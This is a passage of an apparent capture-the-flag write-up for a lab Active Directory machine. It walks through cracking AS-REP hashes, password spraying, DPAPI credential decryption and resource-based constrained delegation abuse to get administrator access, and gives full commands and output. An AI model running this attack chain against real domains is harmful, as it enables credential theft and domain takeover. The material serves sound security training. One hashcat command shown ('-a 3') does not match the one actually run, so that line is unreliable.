$krb5asrep$23$svc_sql@VINTAGE.HTB:45da0adfb1f17d7a21c6477b20635edb$5ebc4b7b47601ca7085f297ee1c1988e768052b4007bdb59fece2ac549d1ac6483aacafe1d9c80f622b80430ca4eef035bb6be796d4ef92703d616447ed4de4122f5b7e52ae3808a7d9e489b8a4ed8d8c48c198c22aab0198ffa567730a9fc1714bf02b377eb0f9206100909cb575a36cfa2f1dbf9d94e2b158da8b01b1422e5dbfce68b770a49c417dea8052cc26c2a8ba507e8419c7a5d5fc65be0b8cb503ab5da42f3612eb244e2170196bb646d4feeeb422d48daa67235bd2cb03d6a2e8c3fda74b2c4f63fc9f9bbde1cb3ddbabb38045fa8c481e3afff75f6f83d6e18cb2ab921feffc1379fb4b4
$krb5asrep$23$svc_ldap@VINTAGE.HTB:d463e18baf287c27b5181cf45aa1eaab$c2b55e479d45b1735174f2a2390db82f2d147f50234876da30322590f9c424eae9ddb65bed68465a4842d9dcda59f9fa86d0706a8cb84689e6394a26a25c97e2898a1453a4bd5af62852599d7b91ddfca473af64a61e0ea86ec484b2dcef37a5a5b10d395e79df9a1eb12bf6dbe6113dd49ac0508a050f4453e4c7899f5dcb88f1e9a062b0481755d5b0099bbc178d8038b688605e4ef55999d565ed410e3f1c3b37c8ccab2b47ca2ba22bddb35c1d0b04b750b012bf705aec8f69e0fecb1b05bae9c886ebb83ed660961fe390ccbf343430a89716f0af5f30f075be2b1627aef6adafbfb1ee171f4276
$krb5asrep$23$svc_ark@VINTAGE.HTB:b9cae9b7e59b147fc077cabf2442afd4$db833fe5ce1ad887c5f30d2cbbc48e294d3dde348fcac316fe8f1ad068be1d1e6882fa213cf7ea2c12ea4e1ef05af0913c010853497d33ef9b1415363bd44b1e3b0f94e2acda670c89077f3e5cc1e4dfb400efdaa7c696685ee696e03087a5ef4a6b8d7dc070aa071726fc7a98dfcd407c8fe28985e0f134cb12bbf8cdfdce4a8668cf4709bcbb70f88452208a1a517237a10d1c006eb6578e639e0e013e7dc28fe7eb759383bac09f2b75c7349d379ee6aac9fe9aa1498896b76b085a4b3cfbfec673afc673e4536b07457ff86d61fd324eb9790e86660879cfcce3b446880f2626caf01f9a30a6687a
[-] User C.Neri_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User L.Bianchi_adm doesn't have UF_DONT_REQUIRE_PREAUTH set
```

And we crack the first kerberos hash with hashcat first we put it in a `hash.txt` file and once that is done we run the following command to decrypt the password

```bash
hashcat -a 3 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

```bash
❯ hashcat -a 0 -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 6.0+debian  Linux, None+Asserts, RELOC, LLVM 18.1.8, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 3 digests; 3 unique digests, 3 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Not-Iterated

ATTENTION! Pure (unoptimized) backend kernels selected.
Pure kernels can crack longer passwords, but drastically reduce performance.
If you want to switch to optimized kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344386
* Bytes.....: 139921518
* Keyspace..: 14344386

$krb5asrep$23$svc_sql@VINTAGE.HTB:45da0adfb1f17d7a21c6477b20635edb$5ebc4b7b47601ca7085f297ee1c1988e768052b4007bdb59fece2ac549d1ac6483aacafe1d9c80f622b80430ca4eef035bb6be796d4ef92703d616447ed4de4122f5b7e52ae3808a7d9e489b8a4ed8d8c48c198c22aab0198ffa567730a9fc1714bf02b377eb0f9206100909cb575a36cfa2f1dbf9d94e2b158da8b01b1422e5dbfce68b770a49c417dea8052cc26c2a8ba507e8419c7a5d5fc65be0b8cb503ab5da42f3612eb244e2170196bb646d4feeeb422d48daa67235bd2cb03d6a2e8c3fda74b2c4f63fc9f9bbde1cb3ddbabb38045fa8c481e3afff75f6f83d6e18cb2ab921feffc1379fb4b4:Zer0the0ne
Cracking performance lower than expected?                 

* Append -O to the commandline.
  This lowers the maximum supported password/salt length (usually down to 32).

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework
```

And we see that `Zer0the0ne` is the password for **SVC_SQL**


### KERBRUTE
---
`Kerbrute` is a tool designed to interact with the **Kerberos** protocol, which is the authentication system used in **Active Directory (AD)** environments. In more specific terms, `Kerbrute` is primarily used to perform brute force attacks and username enumeration in a **Kerberos**-based domain.

To force the user, we execute the following command

```bash
❯./kerbrute --dc vintage.htb -d vintage.htb -v passwordspray usernames.txt Zer0the0ne
 
    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        
 
Version: v1.0.3 (9dad6e1) - 12/04/24 - Ronnie Flathers @ropnop
 
2024/12/04 09:36:16 >  Using KDC(s):
2024/12/04 09:36:16 >   vintage.htb:88
 
2024/12/04 09:36:16 >  [!] krbtgt@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] Guest@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] gMSA01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] FS01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] M.Rossi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] L.Bianchi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] R.Verdi@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] DC01$@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] G.Viola@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] Administrator@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_sql@vintage.htb:Zer0the0ne - USER LOCKED OUT
2024/12/04 09:36:17 >  [!] P.Rosa@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_ark@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] L.Bianchi_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] svc_ldap@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [!] C.Neri_adm@vintage.htb:Zer0the0ne - Invalid password
2024/12/04 09:36:17 >  [+] VALID LOGIN:  C.Neri@vintage.htb:Zer0the0ne
2024/12/04 09:36:17 >  Done! Tested 17 logins (1 successes) in 0.481 seconds
```

The account C.Neri@vintage.htb has successfully logged in with the password Zer0the0ne. Let's take a look at his privileges with **BloodHound**

![[Screenshot 2025-03-07 132847.jpg]]

We see that it belongs to the group `SERVICEMANAGERS@VINTAGE.HTB` so we are going to get the credentials for this account, we run the following

```bash
impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb
```

```bash
❯ impacket-getTGT vintage.htb/c.neri:Zer0the0ne -dc-ip vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in c.neri.ccache
```

And we export the kerberos ticket
```bash
export KRB5CCNAME=c.neri.ccache
```

Then we log in remotely using port 5985 and using the following command

```bash
evil-winrm -i dc01.vintage.htb -r vintage.htb
```

```bash
❯ evil-winrm -i dc01.vintage.htb -r vintage.htb
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline'
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\C.Neri\Documents> cd ..
*Evil-WinRM* PS C:\Users\C.Neri> ls


    Directory: C:\Users\C.Neri


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---          6/7/2024   1:17 PM                3D Objects
d-r---          6/7/2024   1:17 PM                Contacts
d-r---          6/7/2024   1:19 PM                Desktop
d-r---          6/8/2024   3:02 PM                Documents
d-r---          6/7/2024   1:17 PM                Downloads
d-r---          6/7/2024   1:17 PM                Favorites
d-r---          6/7/2024   1:17 PM                Links
d-r---          6/7/2024   1:17 PM                Music
d-r---          6/7/2024   1:17 PM                Pictures
d-r---          6/7/2024   1:17 PM                Saved Games
d-r---          6/7/2024   1:17 PM                Searches
d-r---          6/7/2024   1:17 PM                Videos


*Evil-WinRM* PS C:\Users\C.Neri> cd Desktop
*Evil-WinRM* PS C:\Users\C.Neri\Desktop> cat user.txt
b15d12695f2#########################
```

And we already have the first flag, now we move on to the elevation of privileges

## PRIVILEGE ESCALATION
---
![[Screenshot 2025-03-07 133351.jpg]]

![[Screenshot 2025-03-07 133427.jpg]]

### DPAPI
---
DPAPI (Data Protection API) is a cryptographic API in Windows operating systems that is designed to protect sensitive data, such as passwords, private keys, credentials, etc. It provides applications with the ability to encrypt and decrypt data while hiding complex encryption operations and simplifying the encryption process. DPAPI is designed to ensure that only the current user or system can access the encrypted data.

#### HOW DPAPI WORKS?
---
- `Encryption`: When an application or Windows system needs to store sensitive information, it can encrypt the data through DPAPI. Encryption uses the user's login credentials (such as the user's login password or the computer's key) to generate the encryption key.

- `Decryption`: Only in the same user context can DPAPI use the same key to decrypt data. In this way, if an application or service tries to access encrypted credentials or data, only the currently logged in user or administrator can decrypt and access the information.

- `Security`: DPAPI is based on account authentication information in the Windows operating system, so its encryption key is closely associated with the user's login credentials, ensuring that only specific users can access their own encrypted data.

### SHELL AS ADMINISTRATOR
---
If we investigate a little we find that in the path `C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials` we find the following, and we download it

![[Screenshot 2025-03-07 134118.jpg]]

What we have downloaded we will need later, if we continue investigating we find that in the path `C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115` we find this

![[Screenshot 2025-03-07 134345.jpg]]

Then we try to crack the file `99cf41a3-a552-4cf7-a8d7-aca2d6f7339b` which is the most important since this will give us a password, to crack it we execute the following

```bash
impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
```

- `impacket-dpapi masterkey`: This is the Impacket module for interacting with DPAPI master keys. DPAPI is an API in Windows that allows users to securely encrypt data such as passwords, certificates, and other secrets. Windows uses master keys to protect this encrypted data, and the masterkey command is designed to recover or decrypt those master keys.

- `-file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b`: This is the masterkey file that you want to decrypt. This file is generated by Windows DPAPI and is stored in the user's profile. Master keys are used by DPAPI to encrypt and decrypt sensitive data.

- `-sid S-1-5-21-4024337825-2033394866-2055507597-1115`: The SID (Security Identifier) ​​is the unique identifier for a user on the Windows system. It is needed to decrypt the master key because DPAPI uses the user's SID as part of the encryption/decryption process.

- `-password Zer0the0ne`: This is the user's password associated with the provided SID. To decrypt the master key, you need the user's password, as DPAPI uses the password as part of the key derivation process to protect data.

This command is used to **decrypt a DPAPI master key**. On Windows, when a user encrypts data using DPAPI, a master key is generated that is used for encryption and decryption of that data. Without this key, the data cannot be recovered.

```bash
❯ impacket-dpapi masterkey -file 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b -sid S-1-5-21-4024337825-2033394866-2055507597-1115 -password Zer0the0ne
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : 99cf41a3-a552-4cf7-a8d7-aca2d6f7339b
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

Now to decrypt the key we will use the same impacket tool, with it we execute the following command

```bash
impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
```

```bash
❯ impacket-dpapi credential -file C4BB96844A5C9DD45D5B6A9859252BA6 -key 0xf8901b2125dd10209da9f66562df2e68e89a48cd0278b48a37f510df01418e68b283c61707f3935662443d81c0d352f1bc8055523bf65b2d763191ecd44e525a
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[CREDENTIAL]
LastWritten : 2024-06-07 15:08:23
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000003 (CRED_PERSIST_ENTERPRISE)
Type        : 0x00000001 (CRED_TYPE_GENERIC)
Target      : LegacyGeneric:target=admin_acc
Description : 
Unknown     : 
Username    : vintage\c.neri_adm
Unknown     : Uncr4ck4bl3P4ssW0rd0312
```

The password of `c.neri_adm` is: `Uncr4ck4bl3P4ssW0rd0312`

![[Screenshot 2025-03-07 135854.jpg]]

![[Screenshot 2025-03-07 135906.jpg]]

The next step is to add `C.NERL_ADM` to `DELEGATEDADMINS` so we run the following to add it to the group, however we can use C.Neri to add a SPN to the service account (call it whatever you want) and then use C.Neri_adm to move it to the delegated administrators group, so that we can use this service account to deploy RBCD ABUSE (this service account must be svc_sql, because we only know its password):

```bash
bloodyAD --host dc01.vintage.htb --dc-ip 10.10.11.45 -d "VINTAGE.HTB" -u c.neri_adm -p 'Uncr4ck4bl3P4ssW0rd0312' -k add groupMember "DELEGATEDADMINS" "svc_sql"
```

```bash
bloodyAD --host dc01.vintage.htb -d "VINTAGE.HTB" --dc-ip 10.10.11.45 -k set object "svc_sql" servicePrincipalName -v "cifs/fake"
```

Get an entry for this SVC
```bash
impacket-getTGT vintage.htb/svc_sql:Zer0the0ne -dc-ip dc01.vintage.htb
```

And we export the ticket again

```bash
export KRB5CCNAME=svc_sql.ccache
```

Now, we impersonate the user **L.BIANCHI_ADM** to request a service ticket for the cifs/dc01.vintage.htb service. After successfully obtaining the ticket, we can use it to access the service.

```bash
impacket-getST -spn 'cifs/dc01.vintage.htb' -impersonate L.BIANCHI_ADM -dc-ip 10.10.11.45 -k 'vintage.htb/svc_sql:Zer0the0ne'
```

And we export it again

```bash
export KRB5CCNAME=L.BIANCHI_ADM@cifs_dc01.vintage.htb@VINTAGE.HTB.ccache
```

Now that we have L.BIANCHI's ticket, we can run commands directly through wmiexec

```bash
impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb 
```

```bash
❯ impacket-wmiexec -k -no-pass VINTAGE.HTB/L.BIANCHI_ADM@dc01.vintage.htb
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>dir
 Volume in drive C has no label.
 Volume Serial Number is B8C0-0CD3

 Directory of C:\

05/08/2021  10:20 AM    <DIR>          PerfLogs
11/14/2024  04:45 PM    <DIR>          Program Files
06/05/2024  12:11 PM    <DIR>          Program Files (x86)
11/14/2024  07:47 PM    <DIR>          Users
03/07/2025  03:42 PM    <DIR>          Windows
               0 File(s)              0 bytes
               5 Dir(s)   5,677,051,904 bytes free

C:\>whoami
vintage\l.bianchi_adm
C:\Users\Administrator\Desktop>type root.txt
a0aac1675f2b2##################
```

And now we have both flags!